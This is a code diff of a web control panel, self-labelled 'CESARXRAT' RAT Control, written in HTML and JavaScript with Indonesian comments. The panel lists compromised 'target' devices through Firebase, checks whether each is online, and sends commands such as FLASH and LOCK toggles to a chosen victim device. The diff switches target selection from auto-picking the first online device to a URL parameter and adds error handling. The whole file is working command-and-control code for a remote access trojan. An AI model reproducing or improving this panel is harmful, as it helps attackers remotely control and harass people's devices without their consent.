@@ -68,9 +68,6 @@
             display: inline-block; margin-top: 6px;
             border: 1px solid #4a9eff;
         }
-        .device-info .detail .waiting {
-            font-size: 14px; color: #6a8abf; font-style: italic;
-        }
         .section-title {
             color: #8899dd; font-size: 14px; text-transform: uppercase;
             letter-spacing: 1px; margin: 20px 0 12px 0;
@@ -160,7 +157,6 @@
                 <div class="name" id="deviceName">Memuat...</div>
                 <div class="os" id="deviceOs">- - -</div>
                 <div class="tweak" id="deviceTweak" style="display:none;">Tweak: -</div>
-                <div class="waiting" id="deviceWaiting" style="display:none;">Belum ada perangkat target yang terhubung</div>
             </div>
         </div>
 
@@ -210,128 +206,115 @@
     </div>
 
     <script type="module">
-        import { db, ref, onValue, set, get, child } from './firebase-config.js';
+        import { db, ref, onValue, set } from './firebase-config.js';
 
-        // ===== AMBIL TARGET ID =====
+        // ===== AMBIL TARGET ID DARI URL =====
         const urlParams = new URLSearchParams(window.location.search);
-        let targetId = urlParams.get('target');
+        const targetId = urlParams.get('target');
 
-        let targetRef = null;
-        let currentTargetOnline = false;
+        console.log('[RAT] Target ID dari URL:', targetId);
 
-        // ===== KALAU TIDAK ADA PARAMETER, AMBIL TARGET PERTAMA YANG ONLINE =====
-        async function getFirstOnlineTarget() {
-            const snapshot = await get(child(ref(db), 'targets'));
-            if (snapshot.exists()) {
-                const data = snapshot.val();
-                for (const key in data) {
-                    const target = data[key];
-                    if (target && target.status === 'online') {
-                        return key;
-                    }
-                }
-            }
-            return null;
+        if (!targetId) {
+            alert('Target tidak ditemukan di URL! Kembali ke Device Target.');
+            window.location.href = 'device-target.html';
         }
 
-        // ===== INIT =====
-        async function init() {
-            if (!targetId) {
-                console.log('[RAT] Tidak ada parameter target, ambil target online pertama...');
-                targetId = await getFirstOnlineTarget();
-            }
+        const targetRef = ref(db, 'targets/' + targetId);
+        let currentTargetOnline = false;
 
-            if (!targetId) {
-                document.getElementById('statusText').textContent = 'NO TARGET';
-                document.getElementById('deviceName').textContent = 'Tidak ada target';
-                document.getElementById('deviceWaiting').style.display = 'block';
-                console.log('[RAT] Tidak ada target yang tersedia');
+        // ===== LISTEN STATUS TARGET =====
+        onValue(targetRef, (snapshot) => {
+            const target = snapshot.val();
+            const statusBadge = document.getElementById('statusBadge');
+            const statusText = document.getElementById('statusText');
+            const deviceName = document.getElementById('deviceName');
+            const deviceOs = document.getElementById('deviceOs');
+            const deviceTweak = document.getElementById('deviceTweak');
+
+            if (!target) {
+                console.log('[RAT] Target tidak ditemukan di Firebase');
+                statusBadge.classList.add('offline');
+                statusText.textContent = 'OFFLINE';
+                deviceName.textContent = 'Target tidak ditemukan';
+                deviceOs.textContent = 'ID: ' + targetId;
+                currentTargetOnline = false;
+                disableAllSwitches();
                 return;
             }
 
-            console.log('[RAT] Menggunakan target ID:', targetId);
-            targetRef = ref(db, 'targets/' + targetId);
-            listenTarget();
-        }
+            // Cek timestamp (30 detik)
+            const now = Date.now();
+            const diff = target.timestamp ? (now - target.timestamp) : 999999;
+            const isOnline = diff < 30000 && target.status === 'online';
+            currentTargetOnline = isOnline;
 
-        function listenTarget() {
-            onValue(targetRef, (snapshot) => {
-                const target = snapshot.val();
-                const statusBadge = document.getElementById('statusBadge');
-                const statusText = document.getElementById('statusText');
-                const deviceName = document.getElementById('deviceName');
-                const deviceOs = document.getElementById('deviceOs');
-                const deviceTweak = document.getElementById('deviceTweak');
-                const deviceWaiting = document.getElementById('deviceWaiting');
+            if (isOnline) {
+                statusBadge.classList.remove('offline');
+                statusText.textContent = 'ONLINE';
+                console.log('[RAT] Target ONLINE');
+            } else {
+                statusBadge.classList.add('offline');
+                statusText.textContent = 'OFFLINE';
+                console.log('[RAT] Target OFFLINE. diff =', diff);
+            }
 
-                if (target) {
-                    // Cek timestamp (30 detik)
-                    const now = Date.now();
-                    const diff = target.timestamp ? (now - target.timestamp) : 999999;
-                    const isOnline = diff < 30000 && target.status === 'online';
-                    currentTargetOnline = isOnline;
+            deviceName.textContent = target.name || 'Perangkat Target';
+            deviceOs.textContent = target.os || '- - -';
 
-                    if (isOnline) {
-                        statusBadge.classList.remove('offline');
-                        statusText.textContent = 'ONLINE';
-                    } else {
-                        statusBadge.classList.add('offline');
-                        statusText.textContent = 'OFFLINE';
-                    }
+            if (target.tweak) {
+                deviceTweak.style.display = 'inline-block';
+                deviceTweak.textContent = 'Tweak: ' + target.tweak;
+            } else {
+                deviceTweak.style.display = 'none';
+            }
 
-                    deviceName.textContent = target.name || 'Perangkat Target';
-                    deviceOs.textContent = target.os || '- - -';
+            // Enable/disable switches
+            document.querySelectorAll('.control-box input[type="checkbox"]').forEach(cb => {
+                cb.disabled = !isOnline;
+            });
 
-                    if (target.tweak) {
-                        deviceTweak.style.display = 'inline-block';
-                        deviceTweak.textContent = 'Tweak: ' + target.tweak;
-                    } else {
-                        deviceTweak.style.display = 'none';
-                    }
-                    deviceWaiting.style.display = 'none';
+            if (!isOnline) {
+                document.querySelectorAll('.control-box input[type="checkbox"]').forEach(cb => {
+                    cb.checked = false;
+                });
+                document.querySelectorAll('.control-box .label span').forEach(el => {
+                    el.textContent = 'OFF';
+                    el.className = '';
+                });
+            }
+        });
 
-                    // Enable/disable switches
-                    document.querySelectorAll('.control-box input[type="checkbox"]').forEach(cb => {
-                        cb.disabled = !isOnline;
-                    });
-
-                    if (!isOnline) {
-                        document.querySelectorAll('.control-box input[type="checkbox"]').forEach(cb => {
-                            cb.checked = false;
-                        });
-                        document.querySelectorAll('.control-box .label span').forEach(el => {
-                            el.textContent = 'OFF';
-                            el.className = '';
-                        });
-                    }
-                } else {
-                    currentTargetOnline = false;
-                    statusBadge.classList.add('offline');
-                    statusText.textContent = 'OFFLINE';
-                    deviceName.textContent = 'Target tidak ditemukan';
-                    deviceOs.textContent = '- - -';
-                    deviceTweak.style.display = 'none';
-                    deviceWaiting.style.display = 'block';
-                    deviceWaiting.textContent = 'Target dengan ID ' + targetId + ' tidak ada di Firebase.';
-
-                    document.querySelectorAll('.control-box input[type="checkbox"]').forEach(cb => {
-                        cb.disabled = true;
-                    });
-                }
+        function disableAllSwitches() {
+            document.querySelectorAll('.control-box input[type="checkbox"]').forEach(cb => {
+                cb.disabled = true;
+                cb.checked = false;
+            });
+            document.querySelectorAll('.control-box .label span').forEach(el => {
+                el.textContent = 'OFF';
+                el.className = '';
             });
         }
 
         // ===== KIRIM PERINTAH =====
         function sendCommand(command) {
             if (!currentTargetOnline) {
-                alert('Target offline! Tunggu sampai online.');
+                alert('❌ Target offline! Tunggu sampai online.');
                 return;
             }
-            set(ref(db, 'targets/' + targetId + '/command'), command);
-            document.getElementById('lastCommand').textContent = command;
-            console.log('[RAT] Command sent:', command);
+
+            console.log('[RAT] Mengirim command:', command);
+            set(ref(db, 'targets/' + targetId + '/command'), command)
+                .then(() => {
+                    console.log('[RAT] ✅ Command berhasil dikirim:', command);
+                    document.getElementById('lastCommand').textContent = command;
+                })
+                .catch((error) => {
+                    console.error('[RAT] ❌ Gagal kirim command:', error);
+                    alert('Gagal kirim perintah: ' + error.message);
+                });
         }
 
+        // ===== UPDATE STATUS SWITCH =====
         function updateStatus(checkboxId, statusId) {
             const checkbox = document.getElementById(checkboxId);
             const statusSpan = document.getElementById(statusId);
@@ -344,6 +327,7 @@
             }
         }
 
+        // ===== PASANG LISTENER KE SEMUA SWITCH =====
         const controls = [
             { checkbox: 'flash', status: 'flashStatus', command: 'FLASH' },
             { checkbox: 'lock', status: 'lockStatus', command: 'LOCK' },
@@ -353,18 +337,21 @@
 
         controls.forEach(function(item) {
             const checkboxEl = document.getElementById(item.checkbox);
+            const statusEl = document.getElementById(item.status);
+
             checkboxEl.addEventListener('change', function() {
+                console.log('[RAT] Switch ' + item.checkbox + ' berubah ke:', this.checked);
+
                 const cmd = item.command + (this.checked ? '_ON' : '_OFF');
                 sendCommand(cmd);
                 updateStatus(item.checkbox, item.status);
             });
+
+            // Set status awal
             updateStatus(item.checkbox, item.status);
         });
 
-        // ===== JALANKAN =====
-        init();
-
-        console.log('[CESARXRAT] RAT Control real-time aktif');
+        console.log('[CESARXRAT] RAT Control siap');
     </script>
 </body>
 </html>
